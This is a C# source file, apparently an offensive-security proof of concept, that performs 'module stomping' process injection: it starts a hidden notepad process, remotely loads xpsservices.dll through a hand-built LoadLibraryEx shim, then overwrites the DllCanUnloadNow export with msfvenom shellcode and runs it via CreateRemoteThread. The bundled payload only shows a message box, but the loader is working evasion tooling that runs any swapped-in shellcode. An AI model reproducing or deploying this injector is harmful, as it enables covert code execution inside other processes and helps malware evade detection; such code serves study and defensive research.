﻿using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

namespace ModuleStomp
{
    class ModuleStomping
    {
        static string ModuleName = "xpsservices.dll";

        const uint INFINITE = 0xFFFFFFFF;
        const uint DONT_RESOLVE_DLL_REFERENCES = 0x00000001;

        static byte[] GenerateLLExShim(long loadLibraryExP)
        {
            MemoryStream ms = new MemoryStream();
            BinaryWriter bw = new BinaryWriter(ms);

            //Long winded way of getting bytes as little endian
            if (Is64Bit)
            {
                bw.Write((ulong)loadLibraryExP);
                var loadLibraryExBytes = ms.ToArray();

                return new byte[] {
                    0x48, 0xB8, loadLibraryExBytes[0], loadLibraryExBytes[1], loadLibraryExBytes[2], loadLibraryExBytes[3], loadLibraryExBytes[4], loadLibraryExBytes[5], loadLibraryExBytes[6],loadLibraryExBytes[7],
                    0x49, 0xC7, 0xC0, 0x01, 0x00, 0x00, 0x00,
                    0x48, 0x31, 0xD2,
                    0xFF, 0xE0
                };
            }
            else
            {
                bw.Write((uint)loadLibraryExP);
                var loadLibraryExBytes = ms.ToArray();

                return new byte[] {
                    0xB8, loadLibraryExBytes[0], loadLibraryExBytes[1], loadLibraryExBytes[2], loadLibraryExBytes[3],
                    0x6A, 0x01,
                    0x6A, 0x00,
                    0xFF, 0x74, 0x24, 0x0c,
                    0xFF, 0xD0,
                    0xC2, 0x0C, 0x00
                };
            }
        }

        static void Main(string[] args)
        {
            // Create target process
            var process = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "notepad",
                    WindowStyle = ProcessWindowStyle.Hidden
                }
            };

            try
            {
                process.Start();

                // Load DLL into remote process
                var loadLibraryExPtr = Win32.GetProcAddress(Win32.LoadLibraryA("kernel32.dll"), "LoadLibraryExA");
                var shim = GenerateLLExShim((long)loadLibraryExPtr);
                var encModuleName = Encoding.ASCII.GetBytes(ModuleName);
                var allocModule = Win32.VirtualAllocEx(process.Handle, IntPtr.Zero, (uint)encModuleName.Length + 2, Win32.AllocationType.Commit, Win32.MemoryProtection.ReadWrite);
                var allocShim = Win32.VirtualAllocEx(process.Handle, IntPtr.Zero, (uint)shim.Length, Win32.AllocationType.Commit, Win32.MemoryProtection.ExecuteRead);

                Win32.WriteProcessMemory(process.Handle, allocShim, shim, (uint)shim.Length, out UIntPtr _);
                Win32.WriteProcessMemory(process.Handle, allocModule, encModuleName, (uint)encModuleName.Length, out UIntPtr _);

                var hThread = Win32.CreateRemoteThread(process.Handle, IntPtr.Zero, 0, allocShim, allocModule, 0, IntPtr.Zero);

                // Wait for our loader thread to finish
                Win32.WaitForSingleObject(hThread, INFINITE);

                // Free memory
                Win32.VirtualFreeEx(process.Handle, allocModule, 0, Win32.AllocationType.Release);
                Win32.VirtualFreeEx(process.Handle, allocShim, 0, Win32.AllocationType.Release);

                // Get address of exported function
                var xps = Win32.LoadLibraryExA("xpsservices.dll", IntPtr.Zero, DONT_RESOLVE_DLL_REFERENCES);
                var funcAddress = Win32.GetProcAddress(xps, "DllCanUnloadNow");
                var funcOffset = (long)funcAddress - (long)xps;
                var remoteFuncAddress = IntPtr.Zero;

                process = Process.GetProcessById(process.Id);

                // We need to work out the address of DllCanUnloadNow in the remote process.
                // Typically it will be the same as this process but not always.  So we calculate
                // the offset to the function in this process and add it to the base address
                // of the module in the remote process.

                foreach (ProcessModule module in process.Modules)
                {
                    if (module.ModuleName.Equals(ModuleName, StringComparison.OrdinalIgnoreCase))
                    {
                        remoteFuncAddress = new IntPtr((long)module.BaseAddress + funcOffset);
                        break;
                    }
                }

                if (remoteFuncAddress == IntPtr.Zero)
                {
                    Console.WriteLine("[!] Couldn't find module in remote process, incorrect path maybe?");
                    return;
                }

                // Write and execute shellcode
                Win32.WriteProcessMemory(process.Handle, funcAddress, Shellcode, (uint)Shellcode.Length, out UIntPtr _);
                Win32.CreateRemoteThread(process.Handle, IntPtr.Zero, 0, remoteFuncAddress, IntPtr.Zero, 0, IntPtr.Zero);
            }
            catch (Exception e)
            {
                Console.Error.WriteLine(e.Message);
            }
            finally
            {
                Console.WriteLine("Press any key to kill notepad");
                Console.Read();

                if (!process.HasExited)
                {
                    process.Kill();
                }
            }
        }

        static bool Is64Bit
        {
            get
            {
                return IntPtr.Size == 8;
            }
        }

        static byte[] Shellcode
        {
            get
            {
                if (Is64Bit)
                {
                    // msfvenom -p windows/x64/messagebox EXITFUNC=thread -f csharp
                    return new byte[323] {
                        0xfc,0x48,0x81,0xe4,0xf0,0xff,0xff,0xff,0xe8,0xd0,0x00,0x00,0x00,0x41,0x51,
                        0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x3e,0x48,
                        0x8b,0x52,0x18,0x3e,0x48,0x8b,0x52,0x20,0x3e,0x48,0x8b,0x72,0x50,0x3e,0x48,
                        0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,
                        0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x3e,
                        0x48,0x8b,0x52,0x20,0x3e,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x3e,0x8b,0x80,0x88,
                        0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x6f,0x48,0x01,0xd0,0x50,0x3e,0x8b,0x48,
                        0x18,0x3e,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x5c,0x48,0xff,0xc9,0x3e,
                        0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,
                        0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x3e,0x4c,0x03,0x4c,0x24,
                        0x08,0x45,0x39,0xd1,0x75,0xd6,0x58,0x3e,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
                        0x66,0x3e,0x41,0x8b,0x0c,0x48,0x3e,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x3e,
                        0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,
                        0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,
                        0x59,0x5a,0x3e,0x48,0x8b,0x12,0xe9,0x49,0xff,0xff,0xff,0x5d,0x49,0xc7,0xc1,
                        0x00,0x00,0x00,0x00,0x3e,0x48,0x8d,0x95,0x1a,0x01,0x00,0x00,0x3e,0x4c,0x8d,
                        0x85,0x2b,0x01,0x00,0x00,0x48,0x31,0xc9,0x41,0xba,0x45,0x83,0x56,0x07,0xff,
                        0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,
                        0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,
                        0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x48,0x65,0x6c,0x6c,0x6f,
                        0x2c,0x20,0x66,0x72,0x6f,0x6d,0x20,0x4d,0x53,0x46,0x21,0x00,0x4d,0x65,0x73,
                        0x73,0x61,0x67,0x65,0x42,0x6f,0x78,0x00 };
                }
                else
                {
                    // msfvenom -p windows/messagebox EXITFUNC=thread -f csharp
                    return new byte[272] {
                        0xd9,0xeb,0x9b,0xd9,0x74,0x24,0xf4,0x31,0xd2,0xb2,0x77,0x31,0xc9,0x64,0x8b,
                        0x71,0x30,0x8b,0x76,0x0c,0x8b,0x76,0x1c,0x8b,0x46,0x08,0x8b,0x7e,0x20,0x8b,
                        0x36,0x38,0x4f,0x18,0x75,0xf3,0x59,0x01,0xd1,0xff,0xe1,0x60,0x8b,0x6c,0x24,
                        0x24,0x8b,0x45,0x3c,0x8b,0x54,0x28,0x78,0x01,0xea,0x8b,0x4a,0x18,0x8b,0x5a,
                        0x20,0x01,0xeb,0xe3,0x34,0x49,0x8b,0x34,0x8b,0x01,0xee,0x31,0xff,0x31,0xc0,
                        0xfc,0xac,0x84,0xc0,0x74,0x07,0xc1,0xcf,0x0d,0x01,0xc7,0xeb,0xf4,0x3b,0x7c,
                        0x24,0x28,0x75,0xe1,0x8b,0x5a,0x24,0x01,0xeb,0x66,0x8b,0x0c,0x4b,0x8b,0x5a,
                        0x1c,0x01,0xeb,0x8b,0x04,0x8b,0x01,0xe8,0x89,0x44,0x24,0x1c,0x61,0xc3,0xb2,
                        0x08,0x29,0xd4,0x89,0xe5,0x89,0xc2,0x68,0x8e,0x4e,0x0e,0xec,0x52,0xe8,0x9f,
                        0xff,0xff,0xff,0x89,0x45,0x04,0xbb,0xef,0xce,0xe0,0x60,0x87,0x1c,0x24,0x52,
                        0xe8,0x8e,0xff,0xff,0xff,0x89,0x45,0x08,0x68,0x6c,0x6c,0x20,0x41,0x68,0x33,
                        0x32,0x2e,0x64,0x68,0x75,0x73,0x65,0x72,0x30,0xdb,0x88,0x5c,0x24,0x0a,0x89,
                        0xe6,0x56,0xff,0x55,0x04,0x89,0xc2,0x50,0xbb,0xa8,0xa2,0x4d,0xbc,0x87,0x1c,
                        0x24,0x52,0xe8,0x5f,0xff,0xff,0xff,0x68,0x6f,0x78,0x58,0x20,0x68,0x61,0x67,
                        0x65,0x42,0x68,0x4d,0x65,0x73,0x73,0x31,0xdb,0x88,0x5c,0x24,0x0a,0x89,0xe3,
                        0x68,0x58,0x20,0x20,0x20,0x68,0x4d,0x53,0x46,0x21,0x68,0x72,0x6f,0x6d,0x20,
                        0x68,0x6f,0x2c,0x20,0x66,0x68,0x48,0x65,0x6c,0x6c,0x31,0xc9,0x88,0x4c,0x24,
                        0x10,0x89,0xe1,0x31,0xd2,0x52,0x53,0x51,0x52,0xff,0xd0,0x31,0xc0,0x50,0xff,
                        0x55,0x08 };
                }
            }
        }
    }

    public class Win32
    {

        [Flags]
        public enum AllocationType
        {
            Commit = 0x1000,
            Reserve = 0x2000,
            Decommit = 0x4000,
            Release = 0x8000,
            Reset = 0x80000,
            Physical = 0x400000,
            TopDown = 0x100000,
            WriteWatch = 0x200000,
            LargePages = 0x20000000
        }

        [Flags]
        public enum MemoryProtection
        {
            Execute = 0x10,
            ExecuteRead = 0x20,
            ExecuteReadWrite = 0x40,
            ExecuteWriteCopy = 0x80,
            NoAccess = 0x01,
            ReadOnly = 0x02,
            ReadWrite = 0x04,
            WriteCopy = 0x08,
            GuardModifierflag = 0x100,
            NoCacheModifierflag = 0x200,
            WriteCombineModifierflag = 0x400
        }

        [DllImport("kernel32.dll")]
        public static extern uint WaitForSingleObject(
            IntPtr hHandle,
            uint dwMilliseconds);

        [DllImport("kernel32.dll")]
        public static extern IntPtr VirtualAllocEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            uint dwSize,
            AllocationType flAllocationType,
            MemoryProtection flProtect);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        public static extern bool VirtualFreeEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            int dwSize,
            AllocationType dwFreeType);

        [DllImport("kernel32.dll")]
        public static extern bool WriteProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpBuffer,
            uint nSize,
            out UIntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        public static extern IntPtr LoadLibraryA(
            string fileName);

        [DllImport("kernel32.dll")]
        public static extern IntPtr LoadLibraryExA(
            string lpFileName,
            IntPtr hReservedNull,
            uint dwFlags);

        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(
            IntPtr hModule,
            string procName);

        [DllImport("kernel32.dll")]
        public static extern IntPtr CreateRemoteThread(
            IntPtr hProcess,
            IntPtr lpThreadAttributes,
            uint dwStackSize,
            IntPtr lpStartAddress,
            IntPtr lpParameter,
            uint dwCreationFlags,
            IntPtr lpThreadId);
    }
}